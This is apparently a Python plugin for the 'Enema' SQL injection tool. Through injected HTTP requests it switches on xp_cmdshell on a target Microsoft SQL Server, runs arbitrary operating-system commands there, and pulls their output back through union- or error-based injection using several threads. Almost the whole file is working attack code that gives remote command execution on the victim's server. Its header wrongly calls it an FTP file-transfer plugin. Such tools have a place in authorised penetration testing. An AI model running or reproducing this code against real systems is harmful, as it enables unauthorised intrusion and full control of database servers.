"""
    Enema plugin (mssql): Ftp file transfer
    Copyright (C) 2011 Valeriy Bogachuk
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
"""

import os
import sys
import time
import threading
import core.txtproc
from core.e_const import CONFIG_PATH
from queue import Queue
from core.http import HTTP_Handler
from PyQt6 import QtCore, QtWidgets

from .ui.Ui_xp_cmdshell import Ui_cmdshellWidget


PLUGIN_NAME = "XP_CMDSHELL"
PLUGIN_GROUP = "mssql"
PLUGIN_CLASS_NAME = "CmdShellWidget"
PLUGIN_DESCRIPTION = "xp_cmdshell output fetcher (multithreaded)"


class CmdShellWidget(QtWidgets.QWidget):
    
    logSignal = QtCore.pyqtSignal(str)
     
    def __init__(self, vars, qstrings, parent=None):
        QtWidgets.QWidget.__init__(self, parent, QtCore.Qt.WindowType.Tool)
        self.ui = Ui_cmdshellWidget()
        self.ui.setupUi(self)
        self.setWindowModality(QtCore.Qt.WindowModality.ApplicationModal)
        self.vars = vars
        self.qstrings = qstrings
        self.ui.progressBar.hide()
        
        self.ui.lineCmd.returnPressed.connect(self.lineCmd_OnPressEnter)
        self.ui.killButton.clicked.connect(self.killTask)
        self.ui.enableButton.clicked.connect(self.enableButton_OnClick)
        
        #Load config
        if os.path.exists(CONFIG_PATH):
            settings = QtCore.QSettings(CONFIG_PATH, QtCore.QSettings.Format.IniFormat)
            if settings.value("Main/window_position") is not None: 
                self.move(settings.value("Main/window_position"))
        #---

    def emitLog(self, logStr):
        self.logSignal.emit(logStr)
            
    #Sending kill flag to qthread
    def killTask(self):
        try:
            self.worker.kill()
        except AttributeError:
            return

    def updatePb(self, pbMax, taskDone):
        if taskDone:
            self.ui.progressBar.hide()
            return
        self.ui.progressBar.setMaximum(pbMax)
        self.ui.progressBar.setValue(self.ui.progressBar.value() + 1)

    #Adding xp_cmdshell result
    def cmdOutputAppend(self, rowNum, string, build, rowsCount):
        if build:
            self.ui.tableWidget.setRowCount(rowsCount)
            return
        rData = QtWidgets.QTableWidgetItem()
        rData.setText(string)
        self.ui.tableWidget.setItem(rowNum, 0, rData)

    #FTP Upload button click        
    def lineCmd_OnPressEnter(self):
        if not self.ui.progressBar.isHidden():
            return
        if len(self.ui.lineCmd.text()) < 1:
            return
            
        #Adding variables from plugin widget
        self.vars['cmd'] = self.ui.lineCmd.text()
        self.vars['task'] = "exec"
        #---
        self.ui.lineCmd.clear()
        self.ui.tableWidget.clear()
        self.ui.progressBar.setValue(0)
        self.ui.progressBar.setMaximum(0)
        self.ui.progressBar.show()
        self.worker = Worker(self.vars, self.qstrings)
        #Signal connects
        self.worker.logSignal.connect(self.emitLog, type=QtCore.Qt.ConnectionType.QueuedConnection)
        self.worker.outputSignal.connect(self.cmdOutputAppend, type=QtCore.Qt.ConnectionType.QueuedConnection)
        self.worker.progressSignal.connect(self.updatePb, type=QtCore.Qt.ConnectionType.QueuedConnection)
        #---
        self.worker.start()
        
    #Enable xp_cmdshell button click    
    def enableButton_OnClick(self):
        if not self.ui.progressBar.isHidden():
            return
        self.vars['task'] = "enable"
        self.ui.progressBar.setValue(0)
        self.ui.progressBar.setMaximum(0)
        self.ui.progressBar.show()
        self.worker = Worker(self.vars, self.qstrings)
        self.worker.logSignal.connect(self.emitLog, type=QtCore.Qt.ConnectionType.QueuedConnection)
        self.worker.progressSignal.connect(self.updatePb, type=QtCore.Qt.ConnectionType.QueuedConnection)
        self.worker.start()
    
class Worker(QtCore.QThread):
    
    outputSignal = QtCore.pyqtSignal(int, str, bool, int)
    progressSignal = QtCore.pyqtSignal(int, bool)
    logSignal = QtCore.pyqtSignal(str)
    
    def __init__(self, vars, qstrings):
        QtCore.QThread.__init__(self)
        self.vars = vars
        self.qstrings = qstrings
        self.killed = False
        self.wq = HTTP_Handler()
        self.wq.logSignal.connect(self.log)
        
    def log(self, logStr):
        self.logSignal.emit(logStr)
    
    def kill(self):
        self.killed = True
        
    def run(self):
        self.logSignal.emit("+++ [" + PLUGIN_NAME + "]: TASK STARTED +++")
        if self.vars['task'] == "exec":
            self.xp_cmdshell()
        else:
            self.enable_xp_cmd()
        time.sleep(0.1)
        self.progressSignal.emit(0, True)
        self.logSignal.emit("*** [" + PLUGIN_NAME + "]: TASK DONE ***")
    
    def injType(self, query):
        #Define query string for current injection type
        if self.vars['inj_type'] == "union-based":
            qstring = self.qstrings.value('mssql_union_based/' + query)
        else:
            qstring = self.qstrings.value('mssql_error_based/' + query)
        return qstring
        
    def enable_xp_cmd(self):
        hex = core.txtproc.strToHex(\
        "sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure", True)
        query =  self.wq.buildQuery(self.qstrings.value('mssql_error_based/exec_hex'), self.vars, {'hex' : hex})
        self.wq.httpRequest(query, True, self.vars)
        
    def xp_cmdshell(self):
        execStr = self.qstrings.value('mssql_error_based/exec_hex')
        
        #Delete tmp_table if already exist
        hex = core.txtproc.strToHex("drop table dtpropertie", True)
        query = self.wq.buildQuery(execStr, self.vars, {'hex' : hex})
        self.wq.httpRequest(query, True, self.vars)
        
        #Creating tmp table
        hex = core.txtproc.strToHex(\
        "create table dtpropertie (num int identity, result varchar(8000) NULL, primary key (num))", True)
        query = self.wq.buildQuery(execStr, self.vars, {'hex' : hex})
        self.wq.httpRequest(query, True, self.vars)

        #Inserting xp_cmdshell output to temp table
        hex = core.txtproc.strToHex(\
        "insert dtpropertie exec master..xp_cmdshell '" + self.vars['cmd'] + "'", True)
        query = self.wq.buildQuery(execStr, self.vars, {'hex' : hex})
        self.wq.httpRequest(query, True, self.vars)
        
        #Getting count of rows in temp table
        self.vars['query_cmd'] = "select count(*) from dtpropertie"
        query = self.wq.buildQuery(self.injType('query'), self.vars)
        rowCount = self.wq.httpRequest(query, False, self.vars)
        if rowCount == "no_content":
            return
        
        #Preparing tableWidget
        self.outputSignal.emit(0, '0', True, int(rowCount))
        
        #Multithreadind
        tQueue = Queue()
        threads = []
        for tNum in range(1, int(rowCount)):  
            tQueue.put(tNum)
        for i in range(self.vars['threads']):  
            t = threading.Thread(target=self.mtCmdOutput, args=(tNum, tQueue, rowCount)) 
            threads.append(t)
            t.start()
            time.sleep(0.1)
        for thread in threads:
            thread.join()
            
    #Multithreaded xp_cmdshell output extracting
    def mtCmdOutput(self, tNum, tQueue, rowCount):
        while not self.killed: 
            try:  
                tNum = tQueue.get_nowait()
            except Exception:  
                break
            query = self.wq.buildQuery(self.injType('get_row'), self.vars, {'num' : str(tNum)})
            cmdResult = self.wq.httpRequest(query, False, self.vars)
            if cmdResult == "no_content":
                self.log(sys._getframe().f_code.co_name + "() -> cmdResult", False)
                return
            self.outputSignal.emit(tNum, core.txtproc.recoverSymbols(cmdResult), False, 0)
            time.sleep(0.1)
            tQueue.task_done()
            self.progressSignal.emit(int(rowCount) - 1, False)
        
